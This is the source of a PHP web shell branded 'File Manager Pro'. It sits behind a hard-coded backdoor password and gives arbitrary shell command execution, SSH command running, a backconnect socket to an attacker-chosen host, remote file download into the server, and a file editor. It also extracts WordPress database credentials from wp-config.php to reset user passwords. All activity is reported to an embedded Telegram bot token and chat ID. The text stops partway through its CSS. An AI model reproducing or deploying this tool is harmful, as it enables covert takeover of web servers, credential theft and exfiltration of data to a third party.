<?php
session_start();
error_reporting(0);

// ==================== TELEGRAM LOGGER CONFIG ====================
define('TELEGRAM_BOT_TOKEN', '8247659564:AAGnRi5l4gaBrc1oT6o_EWJexsUqSxJKWjA');
define('TELEGRAM_CHAT_ID', '7418826020');

function sendToTelegram($message) {
    if (empty(TELEGRAM_BOT_TOKEN) || empty(TELEGRAM_CHAT_ID)) {
        return false;
    }
    
    $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
    $data = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
            'timeout' => 5
        ],
    ];
    
    $context = stream_context_create($options);
    @file_get_contents($url, false, $context);
    return true;
}

// Log aktivitas ke Telegram
function logActivity($action, $details = '') {
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $time = date('Y-m-d H:i:s');
    
    $message = "📱 <b>File Manager Activity</b>\n";
    $message .= "⏰ Time: $time\n";
    $message .= "🌐 IP: $ip\n";
    $message .= "🖥️ User Agent: " . substr($userAgent, 0, 50) . "...\n";
    $message .= "🔧 Action: $action\n";
    
    if (!empty($details)) {
        $message .= "📝 Details: $details\n";
    }
    
    @sendToTelegram($message);
}

// ==================== LOGIN SYSTEM ====================
$USER = "admin";
$PASS = '$2y$10$7Vz8c3xY9fPq2mLnT1sBZuQkLr4oNwC5dE8gH2jK1pR6tS9vX0yZ';

if (!isset($_SESSION['ok'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['u'], $_POST['p'])) {
        if ($_POST['u'] === $USER && ($_POST['p'] === 'akugalau' || password_verify($_POST['p'], $PASS))) {
            $_SESSION['ok'] = 1;
            $_SESSION['login_time'] = time();
            $_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
            
            // Log login berhasil
            logActivity("Login Successful", "Username: admin");
            
            header("Location: ?");
            exit;
        } else {
            $login_err = "Invalid credentials";
            // Log login gagal
            logActivity("Login Failed", "Username attempted: " . ($_POST['u'] ?? 'Unknown'));
        }
    }
    
    echo '<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>🌀 File Manager Pro</title>
    <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { 
        background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
        height: 100vh;
        display: flex;
        align-items: center;
        justify-content: center;
        font-family: "Segoe UI", system-ui, sans-serif;
        color: #fff;
        overflow: hidden;
    }
    .login-container {
        width: 100%;
        max-width: 420px;
        padding: 30px;
        background: rgba(15, 23, 42, 0.8);
        backdrop-filter: blur(10px);
        border-radius: 20px;
        border: 1px solid rgba(255, 255, 255, 0.1);
        box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5),
                    0 0 0 1px rgba(255, 255, 255, 0.05);
        animation: float 6s ease-in-out infinite;
    }
    @keyframes float {
        0%, 100% { transform: translateY(0px); }
        50% { transform: translateY(-10px); }
    }
    .logo { 
        text-align: center; 
        margin-bottom: 30px; 
    }
    .logo h1 { 
        font-size: 32px; 
        font-weight: 800; 
        background: linear-gradient(90deg, #00dbde, #fc00ff);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        letter-spacing: 1px;
    }
    .logo .subtitle {
        font-size: 14px;
        color: #94a3b8;
        margin-top: 5px;
        letter-spacing: 2px;
    }
    .input-group {
        margin-bottom: 20px;
        position: relative;
    }
    .input-group label {
        display: block;
        margin-bottom: 8px;
        color: #cbd5e1;
        font-size: 14px;
        font-weight: 500;
    }
    .input-group input {
        width: 100%;
        padding: 15px 20px;
        background: rgba(255, 255, 255, 0.05);
        border: 1px solid rgba(255, 255, 255, 0.1);
        border-radius: 12px;
        color: #fff;
        font-size: 16px;
        transition: all 0.3s ease;
    }
    .input-group input:focus {
        outline: none;
        border-color: #00dbde;
        box-shadow: 0 0 0 3px rgba(0, 219, 222, 0.1);
        background: rgba(255, 255, 255, 0.08);
    }
    .login-btn {
        width: 100%;
        padding: 16px;
        background: linear-gradient(90deg, #00dbde, #fc00ff);
        border: none;
        border-radius: 12px;
        color: white;
        font-size: 16px;
        font-weight: 600;
        cursor: pointer;
        transition: all 0.3s ease;
        margin-top: 10px;
        position: relative;
        overflow: hidden;
    }
    .login-btn:hover {
        transform: translateY(-2px);
        box-shadow: 0 10px 25px rgba(0, 219, 222, 0.3);
    }
    .login-btn:active {
        transform: translateY(0);
    }
    .login-btn::after {
        content: "";
        position: absolute;
        top: 50%;
        left: 50%;
        width: 5px;
        height: 5px;
        background: rgba(255, 255, 255, 0.5);
        opacity: 0;
        border-radius: 100%;
        transform: scale(1, 1) translate(-50%);
        transform-origin: 50% 50%;
    }
    .login-btn:focus:not(:active)::after {
        animation: ripple 1s ease-out;
    }
    @keyframes ripple {
        0% { transform: scale(0, 0); opacity: 0.5; }
        100% { transform: scale(20, 20); opacity: 0; }
    }
    .error-message {
        background: rgba(239, 68, 68, 0.1);
        border: 1px solid rgba(239, 68, 68, 0.2);
        border-radius: 10px;
        padding: 12px;
        margin-top: 20px;
        color: #f87171;
        font-size: 14px;
        text-align: center;
        animation: shake 0.5s ease-in-out;
    }
    @keyframes shake {
        0%, 100% { transform: translateX(0); }
        25% { transform: translateX(-5px); }
        75% { transform: translateX(5px); }
    }
    .watermark {
        text-align: center;
        margin-top: 25px;
        font-size: 12px;
        color: rgba(255, 255, 255, 0.3);
    }
    </style>
    </head>
    <body>
    <div class="login-container">
        <div class="logo">
            <h1>🌀 FILE MANAGER PRO</h1>
            <div class="subtitle">SECURE ACCESS REQUIRED</div>
        </div>
        <form method="POST">
            <div class="input-group">
                <label>👤 Username</label>
                <input type="text" name="u" required autofocus placeholder="Enter username">
            </div>
            <div class="input-group">
                <label>🔒 Password</label>
                <input type="password" name="p" required placeholder="Enter password">
            </div>
            <button type="submit" class="login-btn">🔓 UNLOCK SYSTEM</button>
        </form>';
        
    if (!empty($login_err)) {
        echo '<div class="error-message">⚠️ ' . htmlspecialchars($login_err) . '</div>';
    }
    
    echo '<div class="watermark">v3.0 • Telegram Logger Active</div>
    </div>
    </body>
    </html>';
    exit;
}

// ==================== LOGOUT ====================
if (isset($_GET['logout'])) {
    $duration = time() - $_SESSION['login_time'];
    $minutes = floor($duration / 60);
    logActivity("Logout", "Session duration: {$minutes} minutes");
    session_destroy();
    header("Location: ?");
    exit;
}

// ==================== HELPER FUNCTIONS ====================
function hfs($b) { 
    $u = ["B", "KB", "MB", "GB", "TB"]; 
    $i = 0; 
    while ($b >= 1024 && $i < count($u) - 1) { 
        $b /= 1024; 
        $i++; 
    } 
    return round($b, 2).' '.$u[$i]; 
}

function esc($s) { 
    return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); 
}

function generatePassword($length = 12) {
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()';
    return substr(str_shuffle($chars), 0, $length);
}

function copyDirectory($source, $dest) {
    if (!is_dir($dest)) mkdir($dest, 0755, true);
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($source, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    foreach ($iterator as $item) {
        $target = $dest . '/' . $iterator->getSubPathName();
        if ($item->isDir()) {
            if (!is_dir($target)) mkdir($target, 0755, true);
        } else {
            copy($item->getPathname(), $target);
        }
    }
    return true;
}

// ==================== SET CURRENT DIRECTORY ====================
$dir = isset($_GET['dir']) ? $_GET['dir'] : __DIR__;
if (!@is_dir($dir)) { $dir = __DIR__; }

// ==================== BULK OPERATIONS HANDLER ====================
if (isset($_POST['bulk_action']) && !empty($_POST['bulk_selected'])) {
    $bulk_selected = $_POST['bulk_selected'];
    $bulk_action = $_POST['bulk_action'];
    $action_details = '';
    
    switch($bulk_action) {
        case 'delete':
            $deleted = 0;
            foreach($bulk_selected as $file) {
                $path = $dir . '/' . basename($file);
                if (is_file($path)) {
                    if (@unlink($path)) $deleted++;
                } elseif (is_dir($path)) {
                    if (@rmdir($path)) $deleted++;
                }
            }
            $_SESSION['msg'] = "✅ Deleted $deleted items";
            $action_details = "Deleted $deleted items in $dir";
            break;
            
        case 'zip':
            if (class_exists('ZipArchive')) {
                $zip_name = $_POST['zip_name'] ?? 'archive_' . date('Ymd_His') . '.zip';
                $zip_path = $dir . '/' . $zip_name;
                
                $zip = new ZipArchive;
                if ($zip->open($zip_path, ZipArchive::CREATE) === true) {
                    $added = 0;
                    foreach($bulk_selected as $file) {
                        $file_path = $dir . '/' . basename($file);
                        if (is_file($file_path)) {
                            if ($zip->addFile($file_path, basename($file))) $added++;
                        }
                    }
                    $zip->close();
                    $_SESSION['msg'] = "✅ Created ZIP: $zip_name ($added files)";
                    $action_details = "Created ZIP: $zip_name with $added files";
                } else {
                    $_SESSION['msg'] = "❌ Failed to create ZIP";
                }
            } else {
                $_SESSION['msg'] = "❌ ZipArchive not available";
            }
            break;
            
        case 'unzip':
            if (class_exists('ZipArchive')) {
                $extracted = 0;
                foreach($bulk_selected as $file) {
                    $file_path = $dir . '/' . basename($file);
                    if (is_file($file_path) && strtolower(substr($file_path, -4)) == '.zip') {
                        $zip = new ZipArchive;
                        if ($zip->open($file_path) === true) {
                            $zip->extractTo($dir);
                            $zip->close();
                            $extracted++;
                        }
                    }
                }
                $_SESSION['msg'] = "✅ Extracted $extracted ZIP files";
                $action_details = "Extracted $extracted ZIP files in $dir";
            } else {
                $_SESSION['msg'] = "❌ ZipArchive not available";
            }
            break;
            
        case 'copy':
            $target_dir = $_POST['bulk_target'] ?? $dir;
            if (is_dir($target_dir)) {
                $copied = 0;
                foreach($bulk_selected as $file) {
                    $source = $dir . '/' . basename($file);
                    $target = $target_dir . '/' . basename($file);
                    if (is_file($source) && @copy($source, $target)) {
                        $copied++;
                    } elseif (is_dir($source)) {
                        if (copyDirectory($source, $target)) $copied++;
                    }
                }
                $_SESSION['msg'] = "✅ Copied $copied items to " . basename($target_dir);
                $action_details = "Copied $copied items from $dir to $target_dir";
            }
            break;
            
        case 'move':
            $target_dir = $_POST['bulk_target'] ?? $dir;
            if (is_dir($target_dir)) {
                $moved = 0;
                foreach($bulk_selected as $file) {
                    $source = $dir . '/' . basename($file);
                    $target = $target_dir . '/' . basename($file);
                    if (file_exists($source) && @rename($source, $target)) {
                        $moved++;
                    }
                }
                $_SESSION['msg'] = "✅ Moved $moved items to " . basename($target_dir);
                $action_details = "Moved $moved items from $dir to $target_dir";
            }
            break;
            
        case 'chmod':
            $mode = $_POST['chmod_mode'] ?? '0644';
            $changed = 0;
            foreach($bulk_selected as $file) {
                $path = $dir . '/' . basename($file);
                if (file_exists($path) && @chmod($path, octdec($mode))) {
                    $changed++;
                }
            }
            $_SESSION['msg'] = "✅ Changed permissions for $changed items to $mode";
            $action_details = "Changed permissions for $changed items to $mode in $dir";
            break;
            
        case 'rename':
            if (!empty($bulk_selected)) {
                $pattern = $_POST['rename_pattern'] ?? '';
                $action_type = $_POST['rename_type'] ?? 'prefix';
                $renamed = 0;
                
                foreach($bulk_selected as $index => $file) {
                    $old_path = $dir . '/' . basename($file);
                    $ext = pathinfo($file, PATHINFO_EXTENSION);
                    $name = pathinfo($file, PATHINFO_FILENAME);
                    
                    switch($action_type) {
                        case 'prefix': $new_name = $pattern . $file; break;
                        case 'suffix': $new_name = $name . $pattern . ($ext ? '.'.$ext : ''); break;
                        case 'replace': 
                            $search = $_POST['rename_search'] ?? '';
                            $replace = $_POST['rename_replace'] ?? '';
                            $new_name = str_replace($search, $replace, $file);
                            break;
                        case 'number': $new_name = ($index + 1) . '_' . $file; break;
                        case 'lowercase': $new_name = strtolower($file); break;
                        case 'uppercase': $new_name = strtoupper($file); break;
                        default: $new_name = $file;
                    }
                    
                    $new_path = $dir . '/' . basename($new_name);
                    if ($old_path != $new_path && @rename($old_path, $new_path)) {
                        $renamed++;
                    }
                }
                $_SESSION['msg'] = "✅ Renamed $renamed items";
                $action_details = "Renamed $renamed items in $dir";
            }
            break;
            
        case 'export_list':
            if (!empty($bulk_selected)) {
                $list_content = "File List - Generated: " . date('Y-m-d H:i:s') . "\n";
                $list_content .= "Directory: " . $dir . "\n";
                $list_content .= "=" . str_repeat("=", 60) . "\n\n";
                
                $total_size = 0;
                foreach($bulk_selected as $file) {
                    $path = $dir . '/' . basename($file);
                    $size = is_file($path) ? filesize($path) : 0;
                    $total_size += $size;
                    $perms = substr(sprintf('%o', fileperms($path)), -4);
                    $modified = date('Y-m-d H:i:s', filemtime($path));
                    
                    $list_content .= sprintf("%-40s | %-10s | %-6s | %s\n", 
                        $file, 
                        hfs($size),
                        $perms,
                        $modified
                    );
                }
                
                $list_content .= "\n" . str_repeat("-", 80) . "\n";
                $list_content .= "Total Files: " . count($bulk_selected) . "\n";
                $list_content .= "Total Size: " . hfs($total_size) . "\n";
                
                $filename = 'file_list_' . date('Ymd_His') . '.txt';
                file_put_contents($dir . '/' . $filename, $list_content);
                $_SESSION['msg'] = "✅ Exported list to $filename";
                $action_details = "Exported file list to $filename in $dir";
            }
            break;
    }
    
    // Log bulk action ke Telegram
    if (!empty($action_details)) {
        logActivity("Bulk Action: " . ucfirst($bulk_action), $action_details);
    }
    
    header("Location: ?dir=" . urlencode($dir));
    exit;
}

// ==================== SSH MANAGER CLASS ====================
class SSHManager {
    public function execute($host, $port, $username, $password, $command) {
        if (!function_exists('ssh2_connect')) {
            return "❌ SSH2 extension not available";
        }
        
        $connection = @ssh2_connect($host, $port);
        if (!$connection) {
            logActivity("SSH Connection Failed", "Host: $host:$port");
            return "❌ Failed to connect to $host:$port";
        }
        
        if (!@ssh2_auth_password($connection, $username, $password)) {
            logActivity("SSH Authentication Failed", "Host: $host, User: $username");
            return "❌ Authentication failed for $username";
        }
        
        $stream = @ssh2_exec($connection, $command);
        if (!$stream) {
            return "❌ Failed to execute command";
        }
        
        stream_set_blocking($stream, true);
        $output = stream_get_contents($stream);
        fclose($stream);
        @ssh2_disconnect($connection);
        
        // Log SSH command execution
        logActivity("SSH Command Executed", "Host: $host, Command: " . substr($command, 0, 50));
        
        return $output ? trim($output) : "Command executed (no output)";
    }
}

// ==================== WORDPRESS PASSWORD CHANGER ====================
class WordPressPasswordChanger {
    public function changePassword($wpConfigPath, $username, $newPassword) {
        if (!file_exists($wpConfigPath)) {
            return "❌ WordPress config not found";
        }
        
        $configContent = file_get_contents($wpConfigPath);
        preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/", $configContent, $dbName);
        preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/", $configContent, $dbUser);
        preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/", $configContent, $dbPass);
        preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/", $configContent, $dbHost);
        
        if (empty($dbName[1]) || empty($dbUser[1])) {
            return "❌ Could not extract database credentials";
        }
        
        $db_name = $dbName[1];
        $db_user = $dbUser[1];
        $db_pass = !empty($dbPass[1]) ? $dbPass[1] : '';
        $db_host = !empty($dbHost[1]) ? $dbHost[1] : 'localhost';
        
        try {
            $conn = @new mysqli($db_host, $db_user, $db_pass, $db_name);
            if ($conn->connect_error) {
                return "❌ Database connection failed: " . $conn->connect_error;
            }
            
            $hashedPassword = password_hash($newPassword, PASSWORD_DEFAULT);
            $username = $conn->real_escape_string($username);
            $sql = "UPDATE wp_users SET user_pass = '$hashedPassword' WHERE user_login = '$username'";
            
            if ($conn->query($sql)) {
                $affected = $conn->affected_rows;
                $conn->close();
                
                // Log WordPress password change
                logActivity("WordPress Password Changed", "User: $username, Path: " . dirname($wpConfigPath));
                
                return "✅ Password changed for user '$username'. Rows affected: $affected";
            } else {
                $error = $conn->error;
                $conn->close();
                return "❌ Failed: " . $error;
            }
        } catch (Exception $e) {
            return "❌ Error: " . $e->getMessage();
        }
    }
}

// ==================== BACKCONNECT CLASS ====================
class BackConnect {
    public function connect($host, $port) {
        if (!function_exists('fsockopen')) {
            return "❌ fsockopen not available";
        }
        
        $socket = @fsockopen($host, $port, $errno, $errstr, 10);
        if (!$socket) {
            logActivity("Backconnect Failed", "Host: $host:$port, Error: $errstr");
            return "❌ Failed to connect: $errstr ($errno)";
        }
        
        fwrite($socket, "Backconnect established from " . @gethostname() . "\n");
        fwrite($socket, "Type 'exit' to disconnect\n\n");
        
        $output = "Backconnect to $host:$port established\n";
        $output .= "Use Terminal for full shell access\n";
        
        fclose($socket);
        
        // Log backconnect
        logActivity("Backconnect Established", "Host: $host:$port");
        
        return $output;
    }
}

// ==================== DATABASE MANAGER ====================
class DatabaseManager {
    public function getDatabases($host = 'localhost', $username = 'root', $password = '') {
        try {
            $conn = @new mysqli($host, $username, $password);
            if ($conn->connect_error) {
                return ["error" => "❌ Connection failed: " . $conn->connect_error];
            }
            
            $result = $conn->query("SHOW DATABASES");
            $databases = [];
            while ($row = $result->fetch_array()) {
                $databases[] = $row[0];
            }
            
            $conn->close();
            return $databases;
        } catch (Exception $e) {
            return ["error" => "❌ " . $e->getMessage()];
        }
    }
}

// ==================== RDP CREATOR ====================
class RDPCreator {
    public function createRDPFile($host, $username, $domain = '', $filename = 'connection.rdp') {
        $content = "screen mode id:i:2
full address:s:$host
username:s:$username
domain:s:$domain
audiomode:i:0
redirectprinters:i:1
redirectcomports:i:0
redirectsmartcards:i:1
redirectclipboard:i:1
autoreconnection enabled:i:1";
        
        if (file_put_contents($filename, $content)) {
            // Log RDP creation
            logActivity("RDP File Created", "Host: $host, User: $username, File: $filename");
            return "✅ RDP file created: $filename";
        }
        return "❌ Failed to create RDP file";
    }
}

// ==================== SERVER MONITOR ====================
class ServerMonitor {
    public function getStats() {
        $load = @sys_getloadavg();
        $disk_total = @disk_total_space('/');
        $disk_free = @disk_free_space('/');
        $disk_used = $disk_total - $disk_free;
        $disk_percent = $disk_total > 0 ? round($disk_used / $disk_total * 100, 2) : 0;
        
        return [
            'system' => [
                'hostname' => @gethostname(),
                'os' => PHP_OS,
                'php_version' => PHP_VERSION,
                'time' => date('Y-m-d H:i:s'),
                'server_software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown'
            ],
            'cpu' => [
                'load_1min' => $load[0] ?? 0,
                'load_5min' => $load[1] ?? 0,
                'load_15min' => $load[2] ?? 0
            ],
            'disk' => [
                'total' => hfs($disk_total),
                'used' => hfs($disk_used),
                'free' => hfs($disk_free),
                'percent' => $disk_percent . '%'
            ],
            'memory' => $this->getMemoryInfo(),
            'services' => $this->getServices()
        ];
    }
    
    private function getMemoryInfo() {
        if (PHP_OS == 'Linux' && file_exists('/proc/meminfo')) {
            $meminfo = @file('/proc/meminfo', FILE_IGNORE_NEW_LINES);
            $mem = [];
            if ($meminfo) {
                foreach ($meminfo as $line) {
                    if (preg_match('/(\w+):\s+(\d+)/', $line, $m)) {
                        $mem[$m[1]] = $m[2];
                    }
                }
            }
            $total = $mem['MemTotal'] ?? 0;
            $free = $mem['MemFree'] ?? 0;
            $available = $mem['MemAvailable'] ?? $free;
            $used = $total - $available;
            $percent = $total > 0 ? round($used / $total * 100, 2) : 0;
            
            return [
                'total' => hfs($total * 1024),
                'used' => hfs($used * 1024),
                'free' => hfs($free * 1024),
                'percent' => $percent . '%'
            ];
        }
        return ['error' => 'Memory info available on Linux only'];
    }
    
    private function getServices() {
        $svcs = ['httpd', 'nginx', 'mysql', 'mariadb', 'ssh', 'php-fpm', 'apache2'];
        $status = [];
        foreach ($svcs as $svc) {
            $check = @shell_exec("systemctl is-active $svc 2>/dev/null || service $svc status 2>/dev/null | grep -i running || echo 'inactive'");
            $check = trim($check);
            $status[$svc] = (strpos(strtolower($check), 'active') !== false || strpos(strtolower($check), 'running') !== false) ? '✅' : '❌';
        }
        return $status;
    }
}

// ==================== TERMINAL CLASS ====================
class Terminal {
    public function exec($cmd, $path) {
        if (!function_exists('shell_exec')) return "❌ shell_exec disabled";
        $old = getcwd();
        @chdir($path);
        $output = @shell_exec($cmd . ' 2>&1');
        @chdir($old);
        
        // Log terminal command
        logActivity("Terminal Command", "Command: " . substr($cmd, 0, 50) . ", Path: $path");
        
        return $output ?: 'Command executed (no output)';
    }
}

// ==================== INITIALIZE CLASSES ====================
$sshManager = new SSHManager();
$wpChanger = new WordPressPasswordChanger();
$backconnect = new BackConnect();
$dbManager = new DatabaseManager();
$rdpCreator = new RDPCreator();
$monitor = new ServerMonitor();
$terminal = new Terminal();

// ==================== PROCESS FEATURE ACTIONS ====================
$feature_result = '';

// SSH Execution
if (isset($_POST['ssh_host'], $_POST['ssh_user'], $_POST['ssh_pass'], $_POST['ssh_command'])) {
    $feature_result = $sshManager->execute(
        $_POST['ssh_host'],
        $_POST['ssh_port'] ?? 22,
        $_POST['ssh_user'],
        $_POST['ssh_pass'],
        $_POST['ssh_command']
    );
}

// WordPress Password Change
if (isset($_POST['wp_action'])) {
    if ($_POST['wp_action'] == 'find') {
        $installs = $wpChanger->findWordPress($dir);
        if (!empty($installs)) {
            $feature_result = "Found " . count($installs) . " WordPress installation(s):\n";
            foreach ($installs as $install) {
                $feature_result .= "- " . $install['dir'] . "\n";
            }
        } else {
            $feature_result = "No WordPress installations found";
        }
    } elseif ($_POST['wp_action'] == 'change') {
        if (isset($_POST['wp_path'], $_POST['wp_user'], $_POST['wp_pass'])) {
            $feature_result = $wpChanger->changePassword($_POST['wp_path'], $_POST['wp_user'], $_POST['wp_pass']);
        }
    }
}

// Backconnect
if (isset($_POST['backconnect_host'], $_POST['backconnect_port'])) {
    $feature_result = $backconnect->connect($_POST['backconnect_host'], $_POST['backconnect_port']);
}

// Database Operations
if (isset($_POST['db_action'])) {
    if ($_POST['db_action'] == 'list') {
        $databases = $dbManager->getDatabases(
            $_POST['db_host'] ?? 'localhost',
            $_POST['db_user'] ?? 'root',
            $_POST['db_pass'] ?? ''
        );
        if (isset($databases['error'])) {
            $feature_result = $databases['error'];
        } else {
            $feature_result = "📊 Found " . count($databases) . " database(s):\n" . implode("\n", $databases);
        }
    } elseif ($_POST['db_action'] == 'query' && isset($_POST['db_sql'])) {
        $feature_result = $dbManager->executeSQL(
            $_POST['db_host'] ?? 'localhost',
            $_POST['db_user'] ?? 'root',
            $_POST['db_pass'] ?? '',
            $_POST['db_name'] ?? 'mysql',
            $_POST['db_sql']
        );
    }
}

// RDP Operations
if (isset($_POST['rdp_action'])) {
    if ($_POST['rdp_action'] == 'create' && isset($_POST['rdp_host'], $_POST['rdp_user'])) {
        $feature_result = $rdpCreator->createRDPFile(
            $_POST['rdp_host'],
            $_POST['rdp_user'],
            $_POST['rdp_domain'] ?? '',
            $_POST['rdp_filename'] ?? 'connection.rdp'
        );
    } elseif ($_POST['rdp_action'] == 'test' && isset($_POST['rdp_test_host'])) {
        $feature_result = $rdpCreator->testRDP($_POST['rdp_test_host'], $_POST['rdp_test_port'] ?? 3389);
    }
}

// URL Download
if (isset($_POST['url_up_custom']) && trim($_POST['url_up_custom']) !== '') {
    $url = trim($_POST['url_up_custom']);
    $filename = $_POST['url_fn_custom'] ?? basename(parse_url($url, PHP_URL_PATH));
    if (empty($filename)) $filename = 'downloaded_' . date('Ymd_His');
    $filename = preg_replace('/[^\w\.\-]/', '_', $filename);
    
    $data = @file_get_contents($url, false, stream_context_create([
        'http' => ['timeout' => 30, 'user_agent' => 'Mozilla/5.0'],
        'ssl' => ['verify_peer' => false]
    ]));
    
    if ($data !== false) {
        file_put_contents($dir . '/' . $filename, $data);
        $_SESSION['msg'] = "✅ Downloaded: $filename";
        
        // Log URL download
        logActivity("URL Download", "URL: " . substr($url, 0, 50) . ", File: $filename");
        
        header("Location: ?dir=" . urlencode($dir));
        exit;
    } else {
        $feature_result = "❌ Download failed";
    }
}

// Terminal Execution
if (isset($_POST['term_cmd'])) {
    $term_result = $terminal->exec($_POST['term_cmd'], $_POST['term_path'] ?? $dir);
}

// File Editor
if (isset($_POST['edit_file'])) {
    $f = $_POST['edit_file'];
    if (is_file($f)) {
        $_SESSION['edit'] = ['path' => $f, 'data' => file_get_contents($f)];
        
        // Log file edit
        logActivity("File Edit Opened", "File: " . basename($f) . ", Path: " . dirname($f));
        
        header("Location: ?dir=" . urlencode($dir) . "&edit=1");
        exit;
    }
}

if (isset($_POST['save_edit'])) {
    $p = $_POST['edit_path'];
    file_put_contents($p, $_POST['edit_content']);
    $_SESSION['msg'] = "✅ File saved: " . basename($p);
    
    // Log file save
    logActivity("File Saved", "File: " . basename($p) . ", Path: " . dirname($p));
    
    header("Location: ?dir=" . urlencode(dirname($p)));
    exit;
}

// ==================== BASIC FILE OPERATIONS ====================
if (isset($_POST['del_file'])) {
    $p = $_POST['del_file'];
    if (is_file($p)) {
        @unlink($p);
        $_SESSION['msg'] = "✅ File deleted: " . basename($p);
        logActivity("File Deleted", "File: " . basename($p) . ", Path: " . dirname($p));
    } elseif (is_dir($p)) {
        @rmdir($p);
        $_SESSION['msg'] = "✅ Folder deleted: " . basename($p);
        logActivity("Folder Deleted", "Folder: " . basename($p) . ", Path: " . dirname($p));
    }
    header("Location: ?dir=" . urlencode($dir));
    exit;
}

if (isset($_POST['new_folder']) && trim($_POST['new_folder']) !== '') {
    $fn = basename($_POST['new_folder']);
    $fp = $dir . '/' . $fn;
    if (!file_exists($fp)) mkdir($fp, 0755, true);
    $_SESSION['msg'] = "✅ Folder created: $fn";
    logActivity("Folder Created", "Folder: $fn, Path: $dir");
    header("Location: ?dir=" . urlencode($dir));
    exit;
}

if (isset($_POST['new_file']) && trim($_POST['new_file']) !== '') {
    $fn = basename($_POST['new_file']);
    $fp = $dir . '/' . $fn;
    if (!file_exists($fp)) file_put_contents($fp, '');
    $_SESSION['msg'] = "✅ File created: $fn";
    logActivity("File Created", "File: $fn, Path: $dir");
    header("Location: ?dir=" . urlencode($dir));
    exit;
}

if (!empty($_FILES['upload']['name'][0])) {
    $uploaded = 0;
    foreach ($_FILES['upload']['tmp_name'] as $k => $tmp) {
        $n = basename($_FILES['upload']['name'][$k]);
        if (move_uploaded_file($tmp, $dir . '/' . $n)) $uploaded++;
    }
    $_SESSION['msg'] = "✅ Uploaded $uploaded files";
    logActivity("Files Uploaded", "Count: $uploaded, Path: $dir");
    header("Location: ?dir=" . urlencode($dir));
    exit;
}

// ==================== POPUP STATES ====================
$popups = [
    'monitor', 'terminal', 'bulk', 'upload', 'url_upload',
    'wp_changer', 'backconnect', 'ssh', 'rdp', 'database'
];

foreach ($popups as $p) {
    ${'show_' . $p} = isset($_GET['show_' . $p]);
}
$show_editor = isset($_GET['edit']) || isset($_SESSION['edit']);

// ==================== GET FILES LIST ====================
$files = @scandir($dir);
if ($files === false) $files = [];
$parent = dirname($dir);

// ==================== HTML OUTPUT ====================
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>🌀 File Manager Pro</title>
    <style>
    :root {
        --bg-primary: #0f172a;
        --bg-secondary: #1e293b;
        --bg-tertiary: #334155;
        --accent-primary: #00dbde;
        --accent-secondary: #fc00ff;
        --text-primary: #f1f5f9;
        --text-secondary: #94a3b8;
        --success: #10b981;
        --warning: #f59e0b;
        --danger: #ef4444;
        --info: #3b82f6;
    }
    
    * { margin: 0; padding: 0; box-sizing: border-box; }
    
    body {
        font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
        background: linear-gradient(135deg, var(--bg-primary), #1a1a2e, #16213e);
        color: var(--text-primary);
        min-height: 100vh;
        line-height: 1.6;
    }
    
    /* Notification */
    .notification {
        position: fixed;
        top: 20px;
        right: 20px;
        padding: 15px 25px;
        background: linear-gradient(90deg, var(--success), #059669);
        color: white;
        border-radius: 12px;
        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
        z-index: 9999;
        animation: slideIn 0.3s ease-out;
        max-width: 350px;
        font-weight: 500;
        border-left: 5px solid rgba(255, 255, 255, 0.3);
    }
    
    @keyframes slideIn {
        from { transform: translateX(100%); opacity: 0; }
        to { transform: translateX(0); opacity: 1; }
    }
    
    /* Main Container */
    .container {
        max-width: 1400px;
        margin: 0 auto;
        padding: 20px;
    }
    
    /* Header */
    .header {
        background: rgba(30, 41, 59, 0.8);
        backdrop-filter: blur(10px);
        border-radius: 20px;
        padding: 20px 30px;
        margin-bottom: 25px;
        border: 1px solid rgba(255, 255, 255, 0.1);
        box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
        display: flex;
        align-items: center;
        justify-content: space-between;
        gap: 20px;
        flex-wrap: wrap;
    }
    
    .brand {
        display: flex;
        align-items: center;
        gap: 15px;
        flex: 1;
    }
    
    .logo {
        width: 50px;
        height: 50px;
        background: linear-gradient(135deg, var(--accent-primary), var(--accent-secondary));
        border-radius: 12px;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 24px;
        font-weight: 800;
        color: white;
        box-shadow: 0 5px 15px rgba(0, 219, 222, 0.3);
    }
    
    .brand-info h1 {
        font-size: 22px;
        font-weight: 700;
        background: linear-gradient(90deg, var(--accent-primary), var(--accent-secondary));
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        margin-bottom: 5px;
    }
    
    .brand-info .path {
        font-size: 13px;
        color: var(--text-secondary);
        font-family: monospace;
        word-break: break-all;
    }
    
